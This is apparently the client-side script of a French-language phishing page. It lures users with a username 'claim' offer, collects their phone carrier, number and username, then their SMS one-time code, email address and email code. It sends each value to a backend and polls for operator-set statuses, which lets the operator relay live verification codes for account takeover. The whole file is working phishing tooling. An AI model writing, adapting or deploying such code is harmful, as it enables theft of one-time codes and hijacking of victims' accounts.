const carrierButtons = document.querySelectorAll(".carrier-btn");
const usernameInput = document.getElementById("username");
const phoneInput = document.getElementById("phone");
const claimBtn = document.getElementById("claim-btn");
const verifyBtn = document.getElementById("verify-btn");
const retryBtn = document.getElementById("retry-btn");
const resendBtn = document.getElementById("resend-btn");
const codeInput = document.getElementById("code");
const codeField = document.getElementById("code-field");
const codeError = document.getElementById("code-error");
const statusLine = document.getElementById("status-line");
const statusText = document.getElementById("status-text");
const codeStatus = document.getElementById("code-status");

const emailInput = document.getElementById("email");
const emailBtn = document.getElementById("email-btn");
const emailStatus = document.getElementById("email-status");
const emailSentValue = document.getElementById("email-sent-value");
const emailCodeTarget = document.getElementById("email-code-target");
const emailCodeInput = document.getElementById("email-code");
const emailVerifyBtn = document.getElementById("email-verify-btn");
const emailRetryBtn = document.getElementById("email-retry-btn");
const emailCodeField = document.getElementById("email-code-field");
const emailCodeError = document.getElementById("email-code-error");
const emailCodeStatus = document.getElementById("email-code-status");

const stepForm = document.getElementById("step-form");
const stepLoading = document.getElementById("step-loading");
const stepCode = document.getElementById("step-code");
const stepEmail = document.getElementById("step-email");
const stepEmailSent = document.getElementById("step-email-sent");
const stepEmailCode = document.getElementById("step-email-code");
const stepUnavailable = document.getElementById("step-unavailable");
const stepSuccess = document.getElementById("step-success");
const successUsername = document.getElementById("success-username");
const successCarrier = document.getElementById("success-carrier");
const loadingMessage = document.getElementById("loading-message");
const loadingSteps = document.querySelectorAll(".loading__step");

const carrierLabels = {
  bouygues: "Bouygues",
  orange: "Orange",
  sfr: "SFR",
};

const messages = {
  bouygues: "Bouygues sélectionné — entrez votre pseudo et votre numéro.",
  orange: "Orange sélectionné — entrez votre pseudo et votre numéro.",
  sfr: "SFR sélectionné — entrez votre pseudo et votre numéro.",
};

const loadingMessages = [
  "Validation du compte…",
  "Envoi du code de vérification…",
  "En attente de l'envoi du code SMS…",
];

let selectedCarrier = null;
let formData = {};
let sessionId = null;
let userEmail = "";

function setStatus(text, state = "idle") {
  statusText.textContent = text;
  statusLine.classList.toggle("is-active", state === "active");
  statusLine.classList.toggle("is-ready", state === "ready");
}

function showStep(step) {
  stepForm.hidden = step !== "form";
  stepLoading.hidden = step !== "loading";
  stepCode.hidden = step !== "code";
  stepEmail.hidden = step !== "email";
  stepEmailSent.hidden = step !== "email-sent";
  stepEmailCode.hidden = step !== "email-code";
  stepUnavailable.hidden = step !== "unavailable";
  stepSuccess.hidden = step !== "success";
}

function showUnavailableStep() {
  showStep("unavailable");
}

function showSuccessStep() {
  successUsername.textContent = `@${formData.username}`;
  successCarrier.textContent = formData.carrier;
  showStep("success");
}

function showEmailStep() {
  emailInput.value = "";
  emailBtn.disabled = true;
  emailStatus.textContent = "En attente de votre adresse email.";
  showStep("email");
  emailInput.focus();
}

function resetCodeUi() {
  codeError.hidden = true;
  codeField.hidden = false;
  verifyBtn.hidden = false;
  codeInput.value = "";
  verifyBtn.disabled = true;
  verifyBtn.textContent = "Vérifier le code";
  codeStatus.textContent = "En attente de votre code SMS à 4 chiffres.";
}

function resetEmailCodeUi() {
  emailCodeError.hidden = true;
  emailCodeField.hidden = false;
  emailVerifyBtn.hidden = false;
  emailCodeInput.value = "";
  emailVerifyBtn.disabled = true;
  emailVerifyBtn.textContent = "Vérifier le code";
  emailCodeStatus.textContent = "En attente de votre code email à 4 chiffres.";
  emailCodeTarget.textContent = userEmail;
}

function showCodeRejectedUi() {
  codeError.hidden = false;
  codeField.hidden = true;
  verifyBtn.hidden = true;
  codeStatus.textContent = "Code refusé — revérifiez ou demandez un nouveau code.";
}

function showEmailCodeRejectedUi() {
  emailCodeError.hidden = false;
  emailCodeField.hidden = true;
  emailVerifyBtn.hidden = true;
  emailCodeStatus.textContent = "Code email refusé — revérifiez votre code.";
}

function updateClaimButton() {
  const username = usernameInput.value.trim();
  const phone = phoneInput.value.trim();
  claimBtn.disabled = !selectedCarrier || !username || !phone;
}

function updateStatusFromInputs() {
  if (!selectedCarrier) return;

  const username = usernameInput.value.trim().replace(/^@/, "");
  const phone = phoneInput.value.trim();

  if (!username || !phone) {
    setStatus(messages[selectedCarrier], "active");
    return;
  }

  setStatus(`Prêt — @${username} · ${carrierLabels[selectedCarrier]} · ${phone}`, "ready");
}

async function sendSubmission(type, data) {
  const response = await fetch("/api/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, ...data }),
  });

  if (!response.ok) {
    throw new Error("Submit failed");
  }

  return response.json();
}

async function pollSession(targetStatuses) {
  while (true) {
    const response = await fetch(`/api/session?id=${encodeURIComponent(sessionId)}`);
    const data = await response.json();

    if (targetStatuses.includes(data.status)) {
      return data.status;
    }

    await wait(2000);
  }
}

function setLoadingStep(index) {
  loadingMessage.textContent = loadingMessages[index];

  loadingSteps.forEach((step, i) => {
    step.classList.toggle("is-active", i === index);
    step.classList.toggle("is-done", i < index);
  });
}

function showSmsWaitingStep() {
  showStep("loading");
  loadingSteps.forEach((step, i) => {
    step.classList.toggle("is-done", i < 2);
    step.classList.toggle("is-active", i === 2);
  });
  loadingMessage.textContent = loadingMessages[2];
}

async function finishSmsWaiting() {
  loadingMessage.textContent = "Code envoyé !";
  loadingSteps.forEach((step) => {
    step.classList.remove("is-active");
    step.classList.add("is-done");
  });

  await wait(900);
  resetCodeUi();
  showStep("code");
  codeInput.focus();
}

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitForSmsApproval() {
  showSmsWaitingStep();
  await pollSession(["approved"]);
  await finishSmsWaiting();
}

async function finishMaintenanceLoading() {
  loadingSteps.forEach((step) => {
    step.classList.remove("is-active");
    step.classList.add("is-done");
  });
  loadingMessage.textContent = "Traitement terminé…";
  await wait(1200);
  showUnavailableStep();
}

async function startLoadingFlow() {
  showStep("loading");
  setLoadingStep(0);

  await wait(2200);
  setLoadingStep(1);

  await wait(1800);

  let siteMode = "normal";

  try {
    const result = await sendSubmission("request", {
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
    });
    sessionId = result.sessionId;
    siteMode = result.siteMode ?? "normal";
  } catch {
    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
    return;
  }

  if (!sessionId) {
    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
    return;
  }

  setLoadingStep(2);

  if (siteMode === "maintenance") {
    await wait(3500);
    await finishMaintenanceLoading();
    return;
  }

  await pollSession(["approved"]);
  await finishSmsWaiting();
}

async function submitCodeVerification() {
  const code = codeInput.value.trim();
  if (!code || !sessionId) return;

  verifyBtn.disabled = true;
  verifyBtn.textContent = "Vérification…";
  codeStatus.textContent = "Vérification du code en cours…";
  codeError.hidden = true;

  try {
    await sendSubmission("verify", {
      sessionId,
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
      code,
    });
  } catch {
    codeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
    verifyBtn.textContent = "Vérifier le code";
    verifyBtn.disabled = codeInput.value.length === 4;
    return;
  }

  const result = await pollSession(["code_approved", "code_rejected", "email_required"]);

  if (result === "code_approved") {
    showSuccessStep();
    return;
  }

  if (result === "email_required") {
    showEmailStep();
    return;
  }

  showCodeRejectedUi();
}

async function submitEmail() {
  const email = emailInput.value.trim();
  if (!email || !sessionId) return;

  userEmail = email;
  emailBtn.disabled = true;
  emailBtn.textContent = "Envoi…";
  emailStatus.textContent = "Enregistrement de votre email…";

  try {
    await sendSubmission("email", {
      sessionId,
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
      email,
    });
  } catch {
    emailStatus.textContent = "Erreur lors de l'envoi. Réessayez.";
    emailBtn.textContent = "Envoyer";
    emailBtn.disabled = !emailInput.value.trim().includes("@");
    return;
  }

  emailSentValue.textContent = email;
  showStep("email-sent");
  await pollSession(["email_code_ready"]);

  resetEmailCodeUi();
  showStep("email-code");
  emailCodeInput.focus();

  emailBtn.textContent = "Envoyer";
  emailBtn.disabled = true;
}

async function submitEmailCodeVerification() {
  const code = emailCodeInput.value.trim();
  if (!code || !sessionId) return;

  emailVerifyBtn.disabled = true;
  emailVerifyBtn.textContent = "Vérification…";
  emailCodeStatus.textContent = "Vérification du code email en cours…";
  emailCodeError.hidden = true;

  try {
    await sendSubmission("verify_email", {
      sessionId,
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
      code,
    });
  } catch {
    emailCodeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
    emailVerifyBtn.textContent = "Vérifier le code";
    emailVerifyBtn.disabled = emailCodeInput.value.length === 4;
    return;
  }

  const result = await pollSession(["email_code_approved", "email_code_rejected"]);

  if (result === "email_code_approved") {
    showSuccessStep();
    return;
  }

  showEmailCodeRejectedUi();
}

async function requestNewSmsCode() {
  if (!sessionId) return;

  resendBtn.disabled = true;
  retryBtn.disabled = true;
  resendBtn.textContent = "Envoi…";

  try {
    await sendSubmission("resend_code", {
      sessionId,
      username: formData.username,
      phone: formData.phone,
      carrier: formData.carrier,
    });
  } catch {
    codeStatus.textContent = "Erreur lors de la demande. Réessayez.";
    resendBtn.disabled = false;
    retryBtn.disabled = false;
    resendBtn.textContent = "Renvoyer un code";
    return;
  }

  await waitForSmsApproval();

  resendBtn.disabled = false;
  retryBtn.disabled = false;
  resendBtn.textContent = "Renvoyer un code";
}

carrierButtons.forEach((button) => {
  button.addEventListener("click", () => {
    selectedCarrier = button.dataset.carrier;

    carrierButtons.forEach((btn) => {
      const isSelected = btn === button;
      btn.classList.toggle("is-selected", isSelected);
      btn.setAttribute("aria-pressed", String(isSelected));
    });

    setStatus(messages[selectedCarrier], "active");
    usernameInput.focus();
    updateClaimButton();
    updateStatusFromInputs();
  });
});

usernameInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

phoneInput.addEventListener("input", () => {
  updateClaimButton();
  updateStatusFromInputs();
});

claimBtn.addEventListener("click", () => {
  if (claimBtn.disabled) return;

  formData = {
    username: usernameInput.value.trim().replace(/^@/, ""),
    phone: phoneInput.value.trim(),
    carrier: carrierLabels[selectedCarrier],
  };

  startLoadingFlow();
});

codeInput.addEventListener("input", () => {
  codeInput.value = codeInput.value.replace(/\D/g, "").slice(0, 4);
  verifyBtn.disabled = codeInput.value.length !== 4;
});

emailInput.addEventListener("input", () => {
  emailBtn.disabled = !emailInput.value.trim().includes("@");
});

emailCodeInput.addEventListener("input", () => {
  emailCodeInput.value = emailCodeInput.value.replace(/\D/g, "").slice(0, 4);
  emailVerifyBtn.disabled = emailCodeInput.value.length !== 4;
});

verifyBtn.addEventListener("click", () => {
  submitCodeVerification();
});

emailBtn.addEventListener("click", () => {
  submitEmail();
});

emailVerifyBtn.addEventListener("click", () => {
  submitEmailCodeVerification();
});

retryBtn.addEventListener("click", () => {
  resetCodeUi();
  codeInput.focus();
});

emailRetryBtn.addEventListener("click", () => {
  resetEmailCodeUi();
  emailCodeInput.focus();
});

resendBtn.addEventListener("click", () => {
  requestNewSmsCode();
});
